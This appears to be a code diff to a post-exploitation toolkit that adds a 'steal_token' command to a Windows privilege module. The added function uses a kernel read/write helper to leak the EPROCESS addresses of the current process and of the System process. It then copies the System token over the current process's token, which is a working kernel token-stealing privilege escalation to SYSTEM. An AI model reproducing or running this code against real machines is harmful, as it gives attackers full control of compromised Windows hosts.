@@ -1,6 +1,8 @@
 import eternalhush as eh
 from additional.clingyspider import api
 from additional.clingyspider import const
+from additional.clingyspider import extapi
+import additional.darknarrator as dana 
 from additional import memrwlib
 from additional.clingyspider.nt_const import *
 import os
@@ -44,10 +46,48 @@ all_privileges = [
     const.SE_CREATE_SYMBOLIC_LINK_NAME,
     const.SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
 ]
+
+def steal_token():
+    current_pid = int(eh.ui.GetEnv("CLSP_PROCESS_ID"))
+    hcurrentproc = api.GetProcessHandle(current_pid, const.PROCESS_ALL_ACCESS)
+    if not hcurrentproc:
+        eh.ui.Echo(f"Failed to get handle to current process ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
+        return
+    
+    current_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, hcurrentproc, current_pid)
+    api.CloseHandle(hcurrentproc)
+    if not current_eprocess:
+        eh.ui.Echo(f"Failed to leak current EPROCESS ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
+        return
+    eh.ui.Echo(f"Current EPROCESS kernel address: {hex(current_eprocess)}", eh.ECHO_DEFAULT)
+
+    target_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, 0x4, 4)
+    if not target_eprocess:
+        eh.ui.Echo(f"Failed to leak System EPROCESS ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
+        return
+    eh.ui.Echo(f"System EPROCESS kernel address: {hex(target_eprocess)}", eh.ECHO_DEFAULT)
+
+    if api.IsX64():
+        token = int.from_bytes(extapi.InvokeUserExtensionApi(dana.DANA_READ_VIRT_MEM, target_eprocess+0x4b8, 8), 'little') & 0xfffffffffffffff0
+        eh.ui.Echo(f"System process token: {hex(token)}", eh.ECHO_DEFAULT)
+        wr = extapi.InvokeUserExtensionApi(dana.DANA_WRITE_VIRT_MEM, current_eprocess+0x4b8, token.to_bytes(8, 'little'))
+        if wr:
+            eh.ui.Echo(f"Token successfully updated", eh.ECHO_GOOD)
+    
+
+
 def main(args):
-    if not args.query_priv and not args.enable_priv and not args.disable_priv:
+    if not args.query_priv and not args.enable_priv and not args.disable_priv and not args.steal_token:
         eh.ui.Echo("No arguments provided. Use .help", eh.ECHO_ERROR)
         return
+
+    if args.steal_token:
+        if dana.DANA_IsReady():
+            return steal_token()
+        else:
+            eh.ui.Echo("Cannot steal token, DarkNarrator not loaded!", eh.ECHO_ERROR)
+            return
+
 
     hproc = args.use_handle
     if not args.use_handle:
